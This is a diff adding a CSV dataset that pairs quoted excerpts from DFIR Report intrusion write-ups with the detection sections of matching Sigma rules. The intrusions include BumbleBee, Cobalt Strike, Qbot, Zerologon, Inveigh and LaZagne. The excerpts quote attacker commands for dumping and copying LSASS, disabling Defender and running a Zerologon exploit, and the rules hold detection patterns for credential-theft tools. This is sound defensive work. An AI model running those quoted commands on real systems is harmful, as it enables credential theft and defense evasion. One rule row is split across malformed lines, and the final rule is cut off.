@@ -1,0 +1,2530 @@
+source_folder,Excerpts from DFIR Report,Excerpts of Supporting Language from DFIR Report Blog Article,Filename,LogSource and Detection,LogSource and Detection Sections of SIGMA Rule
+folder_01,,"**Process Injection:** ""The BumbleBee loader chooses from three specific processes: wabmig.exe, wab.exe, ImagingDevices.exe"" **Remote Thread:** ""Used CreateRemoteThread Win32 function to execute code in rundll32.exe""",create_remote_thread_win_malware_bumblebee.yml,,"logsource:
+  product: windows
+  category: create_remote_thread
+detection:
+  selection:
+    SourceImage|endswith:
+      - '\wabmig.exe'
+      - '\wab.exe'
+      - '\ImagingDevices.exe'
+    TargetImage|endswith: '\rundll32.exe'
+  condition: selection"
+folder_01,,"""dumped lsass using Task Manager and uploaded the dump file to ufile.io using Internet Explorer"" during Diavol ransomware incident",dns_query_win_ufile_io_query.yml,,"logsource:
+  product: windows
+  category: dns_query
+detection:
+  selection:
+    QueryName|contains: 'ufile.io'
+  condition: selection"
+folder_01,,"""Initial execution of the document writes a file to: C:\Users\Public\microsoft.security. The Excel file called wmic to execute the file with regsrv32""",file_event_executable_and_script_creation_by_office_using_file_ext.yml,,"logsource:
+  product: windows
+  category: file_event
+detection:
+  selection1:
+    Image|endswith:
+      - '\winword.exe'
+      - '\excel.exe'
+      - '\powerpnt.exe'
+      - '\outlook.exe'
+  selection2:
+    TargetFilename|endswith:
+      - '.exe', '.dll', '.ocx', '.com'
+      - '.ps1', '.vbs', '.sys', '.bat'
+      - '.scr', '.proj'
+  selection3:
+    TargetFilename|startswith: '4D5A'
+  condition: selection1 and (selection2 or selection3)"
+folder_01,,"""Advanced IP Scanner was used to scan the environment"" with screenshot showing tool usage",file_event_win_advanced_ip_scanner.yml,,"logsource:
+  category: file_event
+  product: windows
+detection:
+  selection:
+    TargetFilename|contains: '\AppData\Local\Temp\Advanced IP Scanner 2'
+  condition: selection"
+folder_01,,"""powershell DownloadFile AnyDesk.msi"" and ""AnyDeskMSI.exe started, start type set to auto"" for remote access",file_event_win_anydesk_writing_susp_binaries.yml,,"logsource:
+  product: windows
+  category: file_event
+detection:
+  selection:
+    Image|endswith:
+      - '\AnyDesk.exe'
+      - '\AnyDeskMSI.exe'
+    TargetFilename|endswith:
+      - '.dll'
+      - '.exe'
+  filter_dlls:
+    TargetFilename|endswith: '\gcapi.dll'
+  condition: selection and not 1 of filter_*"
+folder_01,,"""C:\Program Files\ManageEngine\SupportCenterPlus\bin\msiexec.exe"" with timestamp ""Thu Nov 14 12:00:07 2075"" to ""blend into environment""",file_event_win_cve_2021_44077_poc_default_files.yml,,"logsource:
+  category: file_event
+  product: windows
+detection:
+  selection:
+    TargetFilename|endswith: '\ManageEngine\SupportCenterPlus\bin\msiexec.exe'
+  condition: selection"
+folder_01,,"""Inveigh was run on a domain controller"" during PYSA/Mespinoza ransomware credential access phase",file_event_win_hktl_inveigh_artefacts.yml,,"logsource:
+  product: windows
+  category: file_event
+detection:
+  selection:
+    TargetFilename|endswith:
+      - '\Inveigh-Log.txt'
+      - '\Inveigh-Cleartext.txt'
+      - '\Inveigh-NTLMv1Users.txt'
+      - '\Inveigh-NTLMv2Users.txt'
+      - '\Inveigh-NTLMv1.txt'
+      - '\Inveigh-NTLMv2.txt'
+      - '\Inveigh-FormInput.txt'
+      - '\Inveigh.dll', '\Inveigh.exe'
+      - '\Inveigh.ps1', '\Inveigh-Relay.ps1'
+  condition: selection"
+folder_01,,"""Secretsdump.exe created files with pattern: sessionresume_[random characters]"" for dumping hashes without agents",file_event_win_impacket_file_indicators.yml,,"logsource:
+  product: windows
+  category: file_event
+detection:
+  selection_names_re:
+    TargetFilename|re: '\sessionresume_[a-zA-Z]{8}$'
+  condition: selection_names_re"
+folder_01,,"""Excel file called wmic to execute file with regsrv32"" and ransomware kills Office apps: ""powerpnt, outlook, winword, excel, onenote, msaccess""",file_event_win_office_susp_file_extension.yml,,"logsource:
+  product: windows
+  category: file_event
+detection:
+  selection1:
+    Image|endswith:
+      - '\excel.exe', '\msaccess.exe'
+      - '\mspub.exe', '\powerpnt.exe'
+      - '\visio.exe', '\winword.exe'
+  selection2:
+    TargetFilename|endswith:
+      - '.bat', '.cmd', '.com', '.dll'
+      - '.exe', '.hta', '.ocx', '.proj'
+      - '.ps1', '.scf', '.scr', '.sys'
+      - '.vbe', '.vbs', '.wsf', '.wsh'
+  condition: all of selection*"
+folder_01,,"""%PUBLIC%\\Music\\svchosts.exe"" with persistence: ""Set-ItemProperty Run App Value '%PUBLIC%\\Music\\svchosts.exe'""",file_event_win_susp_public_folder_extension.yml,,"logsource:
+  category: file_event
+  product: windows
+detection:
+  selection:
+    TargetFilename|contains: ':\Users\Public\'
+    TargetFilename|endswith:
+      - '.bat', '.dll', '.exe'
+      - '.hta', '.js', '.ps1'
+      - '.vbe', '.vbs'
+  condition: selection"
+folder_02,,"**CSharp Streamer RAT Detection:** ""When executed, the tool writes a .NET executable to the %USERPROFILE%\\AppData\\Local\\Temp folder using a .tmp extension and then loads it into memory"" **File Path Pattern:** ""%USERPROFILE%\\AppData\\Local\\Temp"" with "".tmp"" extension **Specific Naming:** ""dat[0-9A-Z]{4}.tmp""",image_load_malware_csharp_streamer_dotnet_load.yml,,"logsource:
+    category: image_load
+    product: windows
+detection:
+    selection:
+        ImageLoaded|re: '\\AppData\\Local\\Temp\\dat[0-9A-Z]{4}\.tmp'
+    condition: selection"
+folder_02,,"**Python DLL Sideloading:** ""A legitimate Python executable (setup.exe) was used to load a hidden, modified python311.dll"" **DLL Modification:** ""The modified DLL was designed to remove hooks from Windows API functions"" **Defense Evasion:** ""Implemented defense evasion techniques like obfuscating the payload in memory and bypassing AMSI, WLDP, and ETW""",image_load_side_load_python.yml,,"logsource:
+    category: image_load
+    product: windows
+detection:
+    selection:
+        ImageLoaded|endswith:
+            - '\python39.dll'
+            - '\python310.dll'
+            - '\python311.dll'
+            - '\python312.dll'
+    filter_main_default_install_paths:
+        - ImageLoaded|startswith:
+              - 'C:\Program Files\Python3'
+              - 'C:\Program Files (x86)\Python3'
+        - ImageLoaded|contains: '\AppData\Local\Programs\Python\Python3'
+    filter_optional_visual_studio:
+        ImageLoaded|startswith: 'C:\Program Files\Microsoft Visual Studio\'
+    filter_optional_cpython:
+        ImageLoaded|contains:
+            - '\cpython\externals\'
+            - '\cpython\PCbuild\'
+    filter_main_legit_signature_details:
+        Product: 'Python'
+        Signed: 'true'
+        Description: 'Python'
+        Company: 'Python Software Foundation'
+    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*"
+folder_02,,"**External IP Lookup:** ""icanhazip.tacticalrmm.io was used during the execution of Tactical RMM Agent"" **Purpose:** ""This domain was part of the remote management software's infrastructure for retrieving the current public IP address""",net_connection_win_domain_external_ip_lookup.yml,,"logsource:
+    category: network_connection
+    product: windows
+detection:
+    selection:
+        - DestinationHostname:
+              - 'www.ip.cn'
+              - 'l2.io'
+        - DestinationHostname|contains:
+              - 'api.2ip.ua'
+              - 'api.bigdatacloud.net'
+              - 'api.ipify.org'
+              - 'bot.whatismyipaddress.com'
+              - 'canireachthe.net'
+              - 'checkip.amazonaws.com'
+              - 'checkip.dyndns.org'
+              - 'curlmyip.com'
+              - 'db-ip.com'
+              - 'edns.ip-api.com'
+              - 'eth0.me'
+              - 'freegeoip.app'
+              - 'geoipy.com'
+              - 'getip.pro'
+              - 'icanhazip.com'
+              - 'ident.me'
+              - 'ifconfig.io'
+              - 'ifconfig.me'
+              - 'ip-api.com'
+              - 'ip.360.cn'
+              - 'ip.anysrc.net'
+              - 'ip.taobao.com'
+              - 'ip.tyk.nu'
+              - 'ipaddressworld.com'
+              - 'ipapi.co'
+              - 'ipconfig.io'
+              - 'ipecho.net'
+              - 'ipinfo.io'
+              - 'ipip.net'
+              - 'ipof.in'
+              - 'ipv4.icanhazip.com'
+              - 'ipv4bot.whatismyipaddress.com'
+              - 'ipv6-test.com'
+              - 'ipwho.is'
+              - 'jsonip.com'
+              - 'myexternalip.com'
+              - 'seeip.org'
+              - 'wgetip.com'
+              - 'whatismyip.akamai.com'
+              - 'whois.pconline.com.cn'
+              - 'wtfismyip.com'
+    filter_optional_brave:
+        Image|endswith: '\brave.exe'
+    filter_optional_chrome:
+        Image:
+            - 'C:\Program Files\Google\Chrome\Application\chrome.exe'
+            - 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
+    filter_optional_firefox:
+        Image:
+            - 'C:\Program Files\Mozilla Firefox\firefox.exe'
+            - 'C:\Program Files (x86)\Mozilla Firefox\firefox.exe'
+    filter_optional_ie:
+        Image:
+            - 'C:\Program Files (x86)\Internet Explorer\iexplore.exe'
+            - 'C:\Program Files\Internet Explorer\iexplore.exe'
+    filter_optional_maxthon:
+        Image|endswith: '\maxthon.exe'
+    filter_optional_edge_1:
+        - Image|startswith: 'C:\Program Files (x86)\Microsoft\EdgeWebView\Application\'
+        - Image|endswith: '\WindowsApps\MicrosoftEdge.exe'
+        - Image:
+              - 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'
+              - 'C:\Program Files\Microsoft\Edge\Application\msedge.exe'
+    filter_optional_edge_2:
+        Image|startswith:
+            - 'C:\Program Files (x86)\Microsoft\EdgeCore\'
+            - 'C:\Program Files\Microsoft\EdgeCore\'
+        Image|endswith:
+            - '\msedge.exe'
+            - '\msedgewebview2.exe'
+    filter_optional_opera:
+        Image|endswith: '\opera.exe'
+    filter_optional_safari:
+        Image|endswith: '\safari.exe'
+    filter_optional_seamonkey:
+        Image|endswith: '\seamonkey.exe'
+    filter_optional_vivaldi:
+        Image|endswith: '\vivaldi.exe'
+    filter_optional_whale:
+        Image|endswith: '\whale.exe'
+    condition: selection and not 1 of filter_optional_*"
+folder_02,,"**Named Pipe Communication:** ""The presence of logs indicating the use of 'named pipe services' also increases the likelihood of Meterpreter or possibly Cobaltstrike"" **Qbot Named Pipe:** ""Named pipe 'dce_3d' was used for communication"" (from Qbot article)",pipe_created_susp_malicious_namedpipes.yml,,"logsource:
+    product: windows
+    category: pipe_created
+    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'
+detection:
+    selection:
+        PipeName:
+            - '\46a676ab7f179e511e30dd2dc41bd388'
+            - '\583da945-62af-10e8-4902-a8f205c72b2e'
+            - '\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7'
+            - '\9f81f59bc58452127884ce513865ed20'
+            - '\adschemerpc'
+            - '\ahexec'
+            - '\AnonymousPipe'
+            - '\bc31a7'
+            - '\bc367'
+            - '\bizkaz'
+            - '\csexecsvc'
+            - '\dce_3d'
+            - '\e710f28d59aa529d6792ca6ff0ca1b34'
+            - '\gruntsvc'
+            - '\isapi_dg'
+            - '\isapi_dg2'
+            - '\isapi_http'
+            - '\jaccdpqnvbrrxlaf'
+            - '\lsassw'
+            - '\NamePipe_MoreWindows'
+            - '\pcheap_reuse'
+            - '\Posh*'
+            - '\rpchlp_3'
+            - '\sdlrpc'
+            - '\svcctl'
+            - '\testPipe'
+            - '\winsession'
+    condition: selection"
+folder_02,,"**Domain Compromise:** ""Exploited Zerologon vulnerability (CVE-2020-1472) to obtain domain admin privileges"" **Password Reset:** ""Used an executable named 'cool.exe' to reset domain controller password"" **PowerShell Usage:** Reset-ComputerMachinePassword cmdlet used to change computer account password for domain authentication",posh_pm_susp_reset_computermachinepassword.yml,,"logsource:
+    product: windows
+    category: ps_module
+    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b
+detection:
+    selection:
+        ContextInfo|contains: 'Reset-ComputerMachinePassword'
+    condition: selection"
+folder_02,,"**PowerView Reconnaissance:** ""Get-NetSubnet"" and ""Get-NetComputer -operatingsystem *server*"" **Local Admin Discovery:** ""Invoke-CheckLocalAdminAccess"" and ""Find-LocalAdminAccess"" **Domain Enumeration:** ""Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *""",posh_ps_powerview_malicious_commandlets.yml,,"logsource:
+    product: windows
+    category: ps_script
+    definition: 'Requirements: Script Block Logging must be enabled'
+detection:
+    selection:
+        ScriptBlockText|contains:
+            - 'Export-PowerViewCSV'
+            - 'Find-DomainLocalGroupMember'
+            - 'Find-DomainObjectPropertyOutlier'
+            - 'Find-DomainProcess'
+            - 'Find-DomainShare'
+            - 'Find-DomainUserEvent'
+            - 'Find-DomainUserLocation'
+            - 'Find-ForeignGroup'
+            - 'Find-ForeignUser'
+            - 'Find-GPOComputerAdmin'
+            - 'Find-GPOLocation'
+            - 'Find-InterestingDomain'
+            - 'Find-InterestingFile'
+            - 'Find-LocalAdminAccess'
+            - 'Find-ManagedSecurityGroups'
+            - 'Get-CachedRDPConnection'
+            - 'Get-DFSshare'
+            - 'Get-DomainDFSShare'
+            - 'Get-DomainDNSRecord'
+            - 'Get-DomainDNSZone'
+            - 'Get-DomainFileServer'
+            - 'Get-DomainGPOComputerLocalGroupMapping'
+            - 'Get-DomainGPOLocalGroup'
+            - 'Get-DomainGPOUserLocalGroupMapping'
+            - 'Get-LastLoggedOn'
+            - 'Get-LoggedOnLocal'
+            - 'Get-NetFileServer'
+            - 'Get-NetForest'
+            - 'Get-NetGPOGroup'
+            - 'Get-NetProcess'
+            - 'Get-NetRDPSession'
+            - 'Get-RegistryMountedDrive'
+            - 'Get-RegLoggedOn'
+            - 'Get-WMIRegCachedRDPConnection'
+            - 'Get-WMIRegLastLoggedOn'
+            - 'Get-WMIRegMountedDrive'
+            - 'Get-WMIRegProxy'
+            - 'Invoke-ACLScanner'
+            - 'Invoke-CheckLocalAdminAccess'
+            - 'Invoke-EnumerateLocalAdmin'
+            - 'Invoke-EventHunter'
+            - 'Invoke-FileFinder'
+            - 'Invoke-Kerberoast'
+            - 'Invoke-MapDomainTrust'
+            - 'Invoke-ProcessHunter'
+            - 'Invoke-RevertToSelf'
+            - 'Invoke-ShareFinder'
+            - 'Invoke-UserHunter'
+            - 'Invoke-UserImpersonation'
+            - 'Remove-RemoteConnection'
+            - 'Request-SPNTicket'
+            - 'Resolve-IPAddress'
+    condition: selection"
+folder_02,,"**7zip Compression:** ""They copied the LSASS dump file from a remote workstation"" **Command Used:** ""C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp"" **Credential Access:** ""The compression was likely preparation for potential exfiltration""",proc_creation_win_7zip_exfil_dmp_files.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Description|contains: '7-Zip'
+        - Image|endswith:
+              - '\7z.exe'
+              - '\7zr.exe'
+              - '\7za.exe'
+        - OriginalFileName:
+              - '7z.exe'
+              - '7za.exe'
+    selection_extension:
+        CommandLine|contains:
+            - '.dmp'
+            - '.dump'
+            - '.hdmp'
+    condition: all of selection_*"
+folder_02,,"**Host Discovery:** ""The threat actors used the 'chcp' command as a discovery technique to determine the system's language and locale"" **Command:** ""cmd.exe /c chcp >&2"" **Purpose:** ""Establishing the country of origin based on the language used"" **Motivation:** ""A fail-safe check to ensure certain users or regions were not targeted""",proc_creation_win_chcp_codepage_lookup.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        ParentImage|endswith: '\cmd.exe'
+        ParentCommandLine|windash|contains:
+            - ' -c '
+            - ' -r '
+            - ' -k '
+        Image|endswith: '\chcp.com'
+        CommandLine|endswith:
+            - 'chcp'
+            - 'chcp '
+            - 'chcp  '
+    condition: selection"
+folder_02,,"**Remote Dump Copy:** ""They copied the LSASS dump file from a remote workstation"" **Command:** ""C:\Windows\system32\cmd.exe /C copy \\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp c:\programdata\lsass.dmp"" **Credential Access:** ""LSASS Memory - T1003.001""",proc_creation_win_cmd_copy_dmp_from_share.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\cmd.exe'
+        - OriginalFileName: 'Cmd.Exe'
+    selection_cli:
+        CommandLine|contains|all:
+            - 'copy '
+            - ' \\\\'
+        CommandLine|contains:
+            - '.dmp'
+            - '.dump'
+            - '.hdmp'
+    condition: all of selection_*"
+folder_02,,"**Output Redirection:** ""The threat actors were able to write multiple commands to a batch file by using echo and redirecting the strings to a file named 1.bat"" **File Creation:** ""After they finished writing to that file, they ran certutil to decode the base64 data into an executable file"" **Obfuscation:** Used redirection to create encoded files and batch scripts",proc_creation_win_cmd_redirection_susp_folder.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\cmd.exe'
+        - OriginalFileName: 'Cmd.Exe'
+    selection_cli_1:
+        CommandLine|contains:
+            - '>?%APPDATA%\'
+            - '>?%TEMP%\'
+            - '>?%TMP%\'
+            - '>?%USERPROFILE%\'
+            - '>?C:\ProgramData\'
+            - '>?C:\Temp\'
+            - '>?C:\Users\Public\'
+            - '>?C:\Windows\Temp\'
+    selection_cli_2:
+        CommandLine|contains:
+            - ' >'
+            - '>'"
+folder_02,,,"            - ""'>""",,
+folder_02,,,        CommandLine|contains|all:,,
+folder_02,,,            - 'C:\Users\',,
+folder_02,,,            - '\AppData\Local\',,
+folder_02,,,"    condition: selection_img and 1 of selection_cli_*""",,
+folder_03,,"**ForceV1 Legacy Option:** ""ForceV1 asks for information directly from the kernel space. Conhost connects to the console application"" **High Integrity:** ""High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context""",proc_creation_win_conhost_legacy_option.yml,,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        IntegrityLevel:
+            - 'High'
+            - 'S-1-16-12288'
+        CommandLine|contains|all:
+            - 'conhost.exe'
+            - '0xffffffff'
+            - '-ForceV1'
+    condition: selection"
+folder_03,,"**Defender Disabling:** ""The attackers used three batch scripts (fed1.bat, fed2.bat, fed3.bat) to systematically disable Windows Defender"" **Registry Modifications:** ""reg add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v 'DisableAntiSpyware' /t REG_DWORD /d '1' /f"" **Defense Evasion:** ""Disabling real-time monitoring, stopping Defender services, removing context menu handlers""",proc_creation_win_defender_default_action_modified.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_cmdlet:
+        CommandLine|contains: 'Set-MpPreference'
+    selection_action:
+        CommandLine|contains:
+            - '-LowThreatDefaultAction'
+            - '-ModerateThreatDefaultAction'
+            - '-HighThreatDefaultAction'
+            - '-SevereThreatDefaultAction'
+            - '-ltdefac '
+            - '-mtdefac '
+            - '-htdefac '
+            - '-stdefac '
+    selection_value:
+        CommandLine|contains:
+            - 'Allow'
+            - '6'
+            - 'NoAction'
+            - '9'
+    condition: all of selection_*"
+folder_03,,"**Context Menu Removal:** ""Removing context menu handlers"" as part of systematic Windows Defender disabling **Registry Modification:** ""Registry modifications to turn off Defender features"" **Defense Evasion:** ""Disabling Windows Defender Security Center, removing Defender from startup and system tray""",proc_creation_win_defender_remove_context_menu.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\powershell_ise.exe'
+              - '\powershell.exe'
+              - '\pwsh.exe'
+              - '\reg.exe'
+        - OriginalFileName:
+              - 'powershell_ise.EXE'
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+              - 'reg.exe'
+    selection_action:
+        CommandLine|contains:
+            - 'del'
+            - 'Remove-Item'
+            - 'ri '
+    selection_reg_path:
+        CommandLine|contains: '\shellex\ContextMenuHandlers\EPP'
+    condition: all of selection_*"
+folder_03,,"**Ursnif Reconnaissance:** ""driverquery.exe was used by Ursnif malware as part of its automated discovery commands"" **Output Redirection:** ""The malware executed 'driverquery.exe' and redirected its output to a temporary file named 'BD2C.bin1' in the user's local temp directory"" **System Discovery:** ""Part of a broader set of discovery commands that included systeminfo, net view, tasklist, and other system enumeration utilities""",proc_creation_win_driverquery_recon.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: 'driverquery.exe'
+        - OriginalFileName: 'drvqry.exe'
+    selection_parent:
+        - ParentImage|endswith:
+              - '\cscript.exe'
+              - '\mshta.exe'
+              - '\regsvr32.exe'
+              - '\rundll32.exe'
+              - '\wscript.exe'
+        - ParentImage|contains:
+              - '\AppData\Local\'
+              - '\Users\Public\'
+              - '\Windows\Temp\'
+    condition: all of selection_*"
+folder_03,,"**Driver Reconnaissance:** ""driverquery.exe was used by Ursnif malware as part of its automated discovery commands"" **System Information Gathering:** ""Part of a series of discovery commands aimed at gathering system information, which is consistent with the malware's reconnaissance techniques"" **Automated Discovery:** ""Demonstrating the malware's systematic approach to gathering information about the infected system""",proc_creation_win_driverquery_usage.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: 'driverquery.exe'
+        - OriginalFileName: 'drvqry.exe'
+    filter_main_other:
+        - ParentImage|endswith:
+              - '\cscript.exe'
+              - '\mshta.exe'
+              - '\regsvr32.exe'
+              - '\rundll32.exe'
+              - '\wscript.exe'
+        - ParentImage|contains:
+              - '\AppData\Local\'
+              - '\Users\Public\'
+              - '\Windows\Temp\'
+    condition: selection and not 1 of filter_main_*"
+folder_03,,"**Credential Gathering:** ""Trickbot used esentutl to gather credential-related data"" **Browser Data Access:** ""Accessing MSEdge history, webcache, and saved passwords"" **Conti Recommendation:** ""Conti recommendation to its affiliates to use esentutl to access NTDS dumped file"" **pwgrab Module:** ""Used as part of the 'pwgrab' module for credential theft""",proc_creation_win_esentutl_params.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains|all:
+            - 'esentutl'
+            - ' /p'
+    condition: selection"
+folder_03,,"**Browser Data Theft:** ""Qbot used the built-in Windows utility esentutl.exe to collect browser data from Internet Explorer and Microsoft Edge"" **WebCache Targeting:** ""esentutl.exe /r V01 /l'C:\Users\[REDACTED]\AppData\Local\Microsoft\Windows\WebCache'"" **Data Collection:** ""This technique allows Qbot to access and exfiltrate browser-related data, which is part of its broader data collection strategy""",proc_creation_win_esentutl_webcache.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\esentutl.exe'
+        - OriginalFileName: 'esentutl.exe'
+    selection_flag:
+        CommandLine|windash|contains: '-r'
+    selection_webcache:
+        CommandLine|contains: '\Windows\WebCache'
+    condition: all of selection*"
+folder_03,,"**ZeroLogon PoC:** ""The threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit via an executable named 'zero.exe'"" **Command Format:** ""zero.exe 10.10.10.10 DomainControllerHostName domain.name administrator -c 'powershell.exe'"" **Domain Admin Hash:** ""Purpose: Retrieve the NTLM hash of a Domain Administrator account""",proc_creation_win_exploit_cve_2020_1472_zero_poc.yml,,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_main:
+        ParentImage|endswith: '\cmd.exe'
+        Image|endswith:
+            - '\cool.exe'
+            - '\zero.exe'
+        CommandLine|contains|all:
+            - 'Administrator'
+            - '-c'
+    selection_payloads_1:
+        CommandLine|contains|all:
+            - 'taskkill'
+            - '/f'
+            - '/im'
+    selection_payloads_2:
+        CommandLine|contains: 'powershell'
+    condition: selection_main and 1 of selection_payloads_*"
+folder_03,,"**Operator Mistakes:** ""The threat actors typed 'av_query' into the Windows command prompt, which was not a valid command"" **Command Bloopers:** ""This was likely meant to be a Cobalt Strike aggressor script command for identifying antivirus"" **Accidental Entry:** ""Operators accidentally enter Cobalt Strike-specific commands directly into the host shell, instead of the Cobalt Strike console""",proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - OriginalFileName: 'Cmd.Exe'
+        - Image|endswith: '\cmd.exe'
+    selection_cli:
+        CommandLine|startswith:
+            - 'cmd '
+            - 'cmd.exe'
+            - 'c:\windows\system32\cmd.exe'
+        CommandLine|contains:
+            - 'psinject'
+            - 'spawnas'
+            - 'make_token'
+            - 'remote-exec'
+            - 'rev2self'
+            - 'dcsync'
+            - 'logonpasswords'
+            - 'execute-assembly'
+            - 'getsystem'
+    condition: all of selection_*"
+folder_03,,"**Module Bloopers:** ""Operators accidentally enter Cobalt Strike-specific commands directly into the host shell"" **PowerShell Commands:** ""Invoke-ShareFinder, Get-NetCurrentUser, Get-NetDomain"" **Detection Strategy:** ""The goal is to create a detection mechanism for these human errors that might otherwise go unnoticed during an intrusion"" **Operator Sloppiness:** ""These mistakes as signs of the threat actors' continued sloppiness""",proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - OriginalFileName: 'Cmd.Exe'
+        - Image|endswith: '\cmd.exe'
+    selection_cli:
+        CommandLine|contains:
+            - 'Invoke-UserHunter'
+            - 'Invoke-ShareFinder'
+            - 'Invoke-Kerberoast'
+            - 'Invoke-SMBAutoBrute'
+            - 'Invoke-Nightmare'
+            - 'zerologon'
+            - 'av_query'
+    condition: all of selection_*"
+folder_04,,"**Cobalt Strike Rundll32:** ""C:\Windows\system32\cmd.exe /C rundll32 C:\Windows\system32\SQL.dll, StartW"" **DLL Execution:** ""rundll32 C:\PerfLogs\arti64.dll, rundll"" and ""rundll32 C:\PerfLogs\socks64.dll, rundll"" **StartW Function:** Rundll32 can be used by Cobalt Strike with StartW function to load DLLs from the command line",proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_rundll:
+        - Image|endswith: '\rundll32.exe'
+        - OriginalFileName: RUNDLL32.EXE
+        - CommandLine|contains:
+              - 'rundll32.exe'
+              - 'rundll32 '
+    selection_params:
+        CommandLine|contains: '.dll'
+        CommandLine|endswith:
+            - ' StartW'
+            - ',StartW'
+    condition: all of selection*"
+folder_04,,"**Named Pipes:** ""Commonly uses named pipes with prefixes like \\postex_*, \\status_*, \\msagent_*"" **Rundll32 Patterns:** ""Often uses rundll32.exe to inject malicious code, with command line events showing rundll32.exe without arguments"" **Conhost Patterns:** ""Watch for suspicious rundll32.exe network connections"" **Pipe Redirection:** Monitor Sysmon Event IDs 17 and 18 for named pipes",proc_creation_win_hktl_cobaltstrike_process_patterns.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_generic_1:
+        CommandLine|endswith: 'cmd.exe /C whoami'
+        ParentImage|startswith: 'C:\Temp\'
+    selection_generic_2:
+        ParentImage|endswith:
+            - '\runonce.exe'
+            - '\dllhost.exe'
+        CommandLine|contains|all:
+            - 'cmd.exe /c echo'
+            - '> \\\\.\\pipe'
+    selection_conhost_1:
+        ParentCommandLine|contains|all:
+            - 'cmd.exe /C echo'
+            - ' > \\\\.\\pipe'
+        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'
+    selection_conhost_2:
+        ParentCommandLine|endswith: '/C whoami'
+        CommandLine|endswith: 'conhost.exe 0xffffffff -ForceV1'
+    condition: 1 of selection_*"
+folder_04,,"**Domain Controller Usage:** ""Inveigh was run on a domain controller during this PYSA/Mespinoza ransomware intrusion"" **Credential Access:** ""Used for network reconnaissance or credential harvesting purposes"" **Network MITM:** Cross-platform .NET IPv4/IPv6 machine-in-the-middle tool",proc_creation_win_hktl_inveigh.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: '\Inveigh.exe'
+        - OriginalFileName:
+              - '\Inveigh.exe'
+              - '\Inveigh.dll'
+        - Description: 'Inveigh'
+        - CommandLine|contains:
+              - ' -SpooferIP'
+              - ' -ReplyToIPs '
+              - ' -ReplyToDomains '
+              - ' -ReplyToMACs '
+              - ' -SnifferIP'
+    condition: selection"
+folder_04,,"**Comprehensive Password Dump:** ""LaZagne was used with the '-all' switch to comprehensively extract passwords"" **Command:** ""ls.exe all -oN -output C:\Users\REDACTED"" **Multiple Sources:** ""The tool can dump passwords from Browsers, LSA secrets, System hashes, Keepass, WinSCP, RDP Manager, OpenVPN, Git"" **Admin Privileges:** ""When run with admin privileges, LaZagne attempts to dump credentials from local registry hives""",proc_creation_win_hktl_lazagne.yml,,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_metadata:
+        - Image|endswith: '\lazagne.exe'
+        - Hashes|contains:
+              - 'IMPHASH=ba5546933531fafa869b1f86a4e2a959'
+              - 'IMPHASH=7aa1951517b3b8d38b12f874b66196c9'
+              - 'IMPHASH=be10bb45cef8dcc6869b921dd20884ae'
+              - 'IMPHASH=4e3e7ce958acceeb80e70eeb7d75870e'
+              - 'IMPHASH=fc40519af20116c903e3ff836e366e39'
+              - 'IMPHASH=1975641ebd67bc0f49282a7b8555b7b2'
+              - 'IMPHASH=468ad8de9dcf3ce7a0becc5916ec6adb'
+              - 'IMPHASH=e5d81cf6a49d9472d6de8c1764efdfb4'
+              - 'IMPHASH=b87afca7a1175b7eb49b7c1eb6d58adf'
+    selection_img_cli:
+        Image|contains:
+            - ':\PerfLogs\'
+            - ':\ProgramData\'
+            - ':\Temp\'
+            - ':\Tmp\'
+            - ':\Users\Public\'
+            - ':\Windows\Temp\'
+            - '\$Recycle.bin'
+            - '\AppData\'
+            - '\Desktop\'
+            - '\Downloads\'
+            - '\Favorites\'
+            - '\Links\'
+            - '\Music\'
+            - '\Photos\'
+            - '\Pictures\'
+            - '\Saved Games\'
+            - '\Searches\'
+            - '\Users\Contacts\'
+            - '\Users\Default\'
+            - '\Users\Searches\'
+            - '\Videos\'
+            - '\Windows\addins\'
